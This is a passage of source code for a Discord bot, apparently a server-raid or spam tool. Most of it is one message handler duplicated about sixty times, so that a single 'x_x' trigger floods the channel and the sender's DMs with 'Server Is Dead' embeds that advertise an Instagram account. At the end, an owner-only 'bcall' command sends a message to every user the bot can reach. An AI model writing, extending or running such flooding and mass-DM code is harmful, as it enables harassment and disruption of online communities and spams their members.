   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Come Here Instagram : mug1 !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});















client.on('ready',  () => {
  console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
  console.log('by noone');
  console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
  console.log(`Logged in as  * [ " ${client.user.username} " ] servers! [ " ${client.guilds.size} " ]`);
  console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
  console.log('is online')
client.user.setStatus("dnd");
});






const devs = ["321476121956974595"];
const adminprefix = ["-"];
client.on('message', message => {
    var argresult = message.content.split(` `).slice(1).join(' ');
      if (!devs.includes(message.author.id)) return;
      
  if (message.content.startsWith('ply')) {
    client.user.setGame(argresult);
      message.channel.send(`**✅   ${argresult}**`)
  } else 
     if (message.content === ("leave")) {
    message.guild.leave();        
  } else  
  if (message.content.startsWith('wt')) {
  client.user.setActivity(argresult, {type:'WATCHING'});
      message.channel.send(`**✅   ${argresult}**`)
  } else 
  if (message.content.startsWith('mils')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.send(`**✅   ${argresult}**`)
  } else 
  if (message.content.startsWith('st')) {
    client.user.setGame(argresult, "https://www.twitch.tv/idk");
      message.channel.send(`**✅**`)
  }
  if (message.content.startsWith('setname')) {
  client.user.setUsername(argresult).then
      message.channel.send(`Changing The Name To ..**${argresult}** `)
} else
if (message.content.startsWith('setavatar')) {
  client.user.setAvatar(argresult);
    message.channel.send(`Changing The Avatar To :**${argresult}** `);
}
});

client.on('message', async message => {
if(message.content.startsWith(prefix + "bcall")) {
  let i = client.users.size;
  if(message.author.id !== '321476121956974595') return message.channel.send('❎ » هذا الأمر مخصص لصاحب البوت فقط');
  var args = message.content.split(' ').slice(1).join(' ');
  if(!args) return message.channel.send('❎ » يجب عليك كتابة الرسالة')
  setTimeout(() => {
    message.channel.send(`تم الارسال لـ ${i} شخص`)
  }, client.users.size * 500);
  client.users.forEach(s => {
    s.send(args).catch(e => i--);
  });
}
});

client.login(process.env.BOT_TOKEN);
